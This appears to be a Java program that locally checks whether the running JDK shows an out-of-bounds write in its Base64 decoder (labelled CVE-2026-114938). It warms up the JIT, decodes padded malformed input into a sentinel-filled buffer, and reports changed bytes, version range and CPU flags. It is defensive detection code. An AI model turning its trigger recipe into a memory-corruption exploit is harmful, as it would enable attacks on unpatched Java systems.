import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;
import java.util.Locale;

/**
 * Local-only bounded runtime probe for CVE-2026-114938.
 * Exit 2 means the out-of-bounds behavior was reproduced.
 */
public final class RuntimeProbe {
    private static final byte SENTINEL = (byte) 0x5a;
    private static volatile int sink;

    private RuntimeProbe() {}

    public static void main(String[] args) throws Exception {
        Runtime.Version version = Runtime.version();
        int feature = version.feature();
        int runLength = feature == 17 ? 128 : 64;
        String validText = "A".repeat(runLength);
        String malformedText = validText + "=";
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] valid = validText.getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = malformedText.getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[4096];

        for (int i = 0; i < 200_000; i++) {
            sink += decoder.decode(valid, target);
        }

        Arrays.fill(target, SENTINEL);
        boolean rejected = false;
        try {
            decoder.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int expectedSize = decodedOutputLength(malformed);
        int changed = 0;
        int first = -1;
        int last = -1;
        for (int i = expectedSize; i < target.length; i++) {
            if (target[i] != SENTINEL) {
                changed++;
                if (first < 0) {
                    first = i;
                }
                last = i;
            }
        }

        String cpuGate = cpuGate();
        String versionAssessment = versionAssessment(version);
        System.out.printf(Locale.ROOT, "runtime=%s%n", System.getProperty("java.runtime.version"));
        System.out.printf(Locale.ROOT, "vendor=%s%n", System.getProperty("java.vendor"));
        System.out.printf(Locale.ROOT, "arch=%s%n", System.getProperty("os.arch"));
        System.out.printf(Locale.ROOT, "cpu_gate=%s%n", cpuGate);
        System.out.printf(Locale.ROOT, "version_assessment=%s%n", versionAssessment);
        System.out.printf(Locale.ROOT, "decoder_rejected=%s%n", rejected);
        System.out.printf(Locale.ROOT, "expected_output_size=%d%n", expectedSize);
        System.out.printf(Locale.ROOT, "changed_past_expected=%d%n", changed);
        System.out.printf(Locale.ROOT, "first_changed=%d%n", first);
        System.out.printf(Locale.ROOT, "last_changed=%d%n", last);

        if (rejected && changed > 0) {
            System.out.println("result=VULNERABLE_BEHAVIOR_REPRODUCED");
            System.exit(2);
        }
        System.out.println("result=NOT_REPRODUCED");
    }

    private static int decodedOutputLength(byte[] input) {
        int padding = 0;
        if (input.length > 0 && input[input.length - 1] == '=') {
            padding++;
        }
        if (input.length > 1 && input[input.length - 2] == '=') {
            padding++;
        }
        return 3 * (int) ((input.length + 3L) / 4L) - padding;
    }

    private static String cpuGate() {
        if (!System.getProperty("os.arch", "").toLowerCase(Locale.ROOT).contains("amd64")
            && !System.getProperty("os.arch", "").toLowerCase(Locale.ROOT).contains("x86_64")) {
            return "not_x86_64";
        }
        Path cpuInfo = Path.of("/proc/cpuinfo");
        if (!Files.isReadable(cpuInfo)) {
            return "unknown_non_linux";
        }
        try {
            String text = Files.readString(cpuInfo).toLowerCase(Locale.ROOT);
            String[] required = {"avx512f", "avx512bw", "avx512vbmi", "bmi2"};
            for (String flag : required) {
                if (!text.contains(flag)) {
                    return "missing_" + flag;
                }
            }
            return "supported";
        } catch (Exception ignored) {
            return "unknown_read_error";
        }
    }

    private static String versionAssessment(Runtime.Version version) {
        int feature = version.feature();
        int update = version.update();
        int patch = version.patch();

        if (feature == 17) {
            if (update < 6) return "not_in_known_affected_range";
            if (update > 21 || (update == 21 && patch >= 1)) return "patched_or_newer";
            return "known_affected_range";
        }
        if (feature == 21) {
            if (update > 13 || (update == 13 && patch >= 1)) return "patched_or_newer";
            return "known_affected_range";
        }
        if (feature == 25) {
            if (update > 5 || (update == 5 && patch >= 1)) return "patched_or_newer";
            return "known_affected_range";
        }
        if (feature == 27) {
            if (update > 1 || (update == 1 && patch >= 1)) return "patched_or_newer";
            return "known_affected_range";
        }
        if (feature == 8) {
            return "vendor_specific_oracle_8u511b33_perf_only";
        }
        return "not_in_known_affected_lines";
    }
}
